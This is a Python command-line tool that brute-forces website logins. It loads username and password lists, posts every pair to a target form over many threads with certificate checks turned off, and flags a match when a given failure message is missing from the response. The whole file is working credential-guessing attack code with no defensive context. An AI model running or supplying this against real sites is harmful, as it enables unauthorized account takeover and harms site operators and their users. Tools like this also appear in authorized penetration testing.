import argparse as ap
import queue
import threading as th
import requests as r

from requests.packages.urllib3.exceptions import InsecureRequestWarning
r.packages.urllib3.disable_warnings(InsecureRequestWarning)

def bruter(url, postdata, userfield, passfield, dirqueue, feedback):
    while not dirqueue.empty():
        user, passwd = dirqueue.get().split(':')

        data = {userfield:user, passfield:passwd}

        if postdata:
            for param in postdata.split('&'):
                parname, val = param.split('=')
                data[parname] = val

        try:
            with r.Session() as s:
                req = s.post(url, data=data, verify=False)
                if feedback not in req.text:
                    print('[+] MATCH ===>>> Username %s and password %s worked!' % (user, passwd))
                else:
                    print('[-] Username %s and password %s did not work!' % (user, passwd))
        except ConnectionError as e:
            raise e

        dirqueue.task_done()

def loadCreds(user, userfile, password, passwordfile):
    if user:
        users = [user]
    elif userfile:
        try:
            users = list(map(lambda x: x.strip(), open(userfile, 'r').readlines()))
        except FileNotFoundError as e:
            raise e
    if password:
        passwords = [password]
    elif passwordfile:
        try:
            passwords = list(map(lambda x: x.strip(), open(passwordfile, 'r').readlines()))
        except FileNotFoundError as e:
            raise e

    dirqueue = queue.Queue()

    for tryuser in users:
        for trypasswd in passwords:
            dirqueue.put(tryuser+':'+trypasswd)

    return dirqueue

if __name__ == '__main__':
    parser = ap.ArgumentParser(description="Website login bruteforcer.")
    parser.add_argument('url', help='The URL to be brute forced.')
    usergroup = parser.add_mutually_exclusive_group(required=True)
    usergroup.add_argument('-u', '--user', help='One single user to be tested.')
    usergroup.add_argument('-U', '--userfile', help='A file containing users to be tested.')
    passgroup = parser.add_mutually_exclusive_group(required=True)
    passgroup.add_argument('-p', '--password', help='One single password to be tested.')
    passgroup.add_argument('-P', '--passwordfile', help='A file containing passwords to be tested.')
    parser.add_argument('-t', '--threads', default=1, type=int, help='The number of threads to work with. Default is 1.')
    parser.add_argument('--postdata', help='Extra post parameters to be sent. They must be separated by a &. e.g. par1=val1&par2=val2&par3=val3')
    parser.add_argument('--userfield', help='The name of the username field.', required=True)
    parser.add_argument('--passfield', help='The name of the password field.', required=True)
    parser.add_argument('-f', '--feedback', help='The error message for a failed attempt.', required=True)

    args = parser.parse_args()

    if not args.url.startswith('http'):
        args.url = 'http://'+args.url

    dirqueue = loadCreds(args.user, args.userfile, args.password, args.passwordfile)

    for _ in range(args.threads):
        th.Thread(target=bruter, args=(args.url, args.postdata, args.userfield, args.passfield, dirqueue, args.feedback)).start()

